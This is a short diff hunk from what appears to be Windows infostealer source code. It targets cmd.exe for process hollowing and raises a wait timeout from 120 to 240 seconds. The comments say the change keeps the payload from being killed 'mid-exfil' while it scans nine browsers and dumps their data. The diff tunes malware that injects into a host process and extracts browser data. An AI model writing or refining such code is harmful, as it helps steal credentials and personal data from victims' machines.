@@ -318,7 +318,10 @@ int wmain(int argc,wchar_t** argv){
                             lstrcatW(target_buf,L"\\cmd.exe");
                         }
                         target=target_buf; kill=true;
-                        wait=120000;   // hijack scan + 9 browsers + big dumps: 20s killed the payload mid-exfil
+                        // hijack scan + 9 browsers + big dumps on a slow disk: the full
+                        // extraction measured ~3 min under DEBUG; 120s killed the payload
+                        // mid-exfil and the TerminateProcess below looks like a silent crash.
+                        wait=240000;
                         // falls through to hollowing code below
                     }
                 }
